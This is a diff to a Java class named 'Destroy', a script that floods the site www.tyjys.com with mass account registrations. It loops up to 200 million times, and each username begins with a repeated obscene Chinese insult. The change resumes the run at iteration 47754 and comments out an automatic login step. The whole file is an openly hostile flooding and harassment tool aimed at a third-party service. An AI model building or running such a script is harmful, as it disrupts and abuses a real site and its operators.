@@ -23,8 +23,8 @@ public class Destroy {
     private static ThreadPoolExecutor executorService = new ThreadPoolExecutor(1, 1,
             0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());
 
-    private static ThreadPoolExecutor loginExecutorService = new ThreadPoolExecutor(1, 1,
-            0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());
+//    private static ThreadPoolExecutor loginExecutorService = new ThreadPoolExecutor(1, 1,
+//            0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());
 
     private static Header[] registerHeaders = new BasicHeader[]{
             new BasicHeader(":authority", "www.tyjys.com"),
@@ -59,14 +59,15 @@ public class Destroy {
 
 
     public static void main(String[] args) throws InterruptedException {
-        for (int i = 0; i < 200000000; i++) {
+        for (int i = 47754; i < 200000000; i++) {
             String nextLong = RandomUtils.nextLong(1000L, 9000000000000L) + "";
             String name = "操你妈操你妈操你妈" + nextLong + "_" + i;
             executorService.submit(() -> {
                 boolean reg = reg(name, name, nextLong);
                 if (reg) {
                     System.out.println("--*****************---" + name);
-                    loginExecutorService.submit(() -> login(name, name));
+                    //登录
+                    //loginExecutorService.submit(() -> login(name, name));
                 }
             });
             if (executorService.getQueue().size() > 10) {
